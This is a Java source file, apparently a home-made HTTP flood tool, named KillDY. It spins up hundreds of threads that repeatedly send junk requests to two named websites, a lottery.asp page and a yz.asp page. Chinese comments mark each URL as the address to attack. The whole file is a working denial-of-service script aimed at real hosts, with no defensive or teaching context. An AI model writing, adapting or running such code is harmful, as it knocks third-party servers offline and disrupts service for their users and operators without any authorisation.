package com.baomihua.xss;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class KillDY {
    public static void main(String[] args){
        t2();
    }

    static void t2(){
        System.err.println("启动...");
        int poolSize = 500;
        String name = "dsdsdsds"+System.currentTimeMillis();
        ExecutorService threadPool = Executors.newFixedThreadPool(poolSize);
        TT2[] t2 = new TT2[poolSize];

        for(int i=0,end=poolSize; i<end; i++){
            t2[i] = new TT2();
            t2[i].number = i;
            t2[i].name = name;
            threadPool.execute(t2[i]);

            try {
                Thread.sleep(50);
            } catch (Exception e) {
            }
        }

        try {
            Thread.sleep(1000*60*2);
            for(int i=0,end=poolSize; i<end; i++){
                t2[i].close();
            }

            Thread.sleep(1000*10);
            threadPool.shutdown();
        } catch (Exception e) {
        }

        System.err.println("关闭...");
    }

    static class TT2 extends Thread{
        public int number = 0;
        public String name = "";
        private boolean isRunning = true;

        synchronized public void close(){
            isRunning = false;
        }

        public void run(){
//			int i=1;
            do{
                System.out.println(number);
                t3_1(name);
                try {
                    Thread.sleep(5);
                } catch (Exception e) {
                }
            }while(isRunning);
        }

        void t3_1(String name){
            try {
                //攻击这个地址
                URL url = new URL("http://w.wzzl123.com/z1zzs/lottery.asp");
//				int readLen = 0;
                byte[] buffer = new byte[64];
                InputStream in = null;
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                conn.setRequestProperty("mobile", name);
                conn.setRequestProperty("sname", "1255");
                conn.setConnectTimeout(1000);
                conn.setReadTimeout(500);

                conn.connect();
                in = conn.getInputStream();
                in.read(buffer);
//				while(-1 != (readLen = in.read(buffer))){
////					System.out.println(new String(buffer, 0, readLen));
//				}

                conn.disconnect();
            } catch (Exception e) {
            }
        }
    }

    static void t1(){
        System.err.println("此程序最多运行5分钟.");
        System.err.println("让我们开始吧...");
        System.err.println("===============");
        int poolSize = 50;

        ExecutorService threadPool = Executors.newFixedThreadPool(poolSize);
        TT1 t = null;
        String value = "dkfjdlkjf"+System.currentTimeMillis();

        for(int n=1; n<=10 ;n++){
            for(int i=1,end=poolSize*30; i<=end; i++){
                t = new TT1();
                t.tName = n+"_"+i;
                t.value = value;
                threadPool.execute(t);
            }

            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
            }
        }


        try {
            Thread.sleep(1000*60*4);
            System.err.println("===============");
            System.err.println("程序关闭.");
            threadPool.shutdownNow();
            System.exit(0);
        } catch (Exception e) {
        }
    }

    static class TT1 extends Thread{
        public String tName = "";
        public String value = "";

        public void run(){
            System.out.println(tName+" 启动.");
            t3_1(value);
        }

        void t3_1(String name){
            try {
                //攻击这个地址
                URL url = new URL("http://quanqiuzy.com/yz.asp");
//				int readLen = 0;
                byte[] buffer = new byte[64];
                InputStream in = null;
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();

                conn.setRequestProperty("gamemane", name);
                conn.setRequestProperty("yanzhengma1", "1255");
                conn.setConnectTimeout(1000);
                conn.setReadTimeout(500);

                conn.connect();
                in = conn.getInputStream();
                in.read(buffer);
//				while(-1 != (readLen = in.read(buffer))){
////					System.out.println(new String(buffer, 0, readLen));
//				}

                conn.disconnect();
            } catch (Exception e) {
            }
        }
    }
}
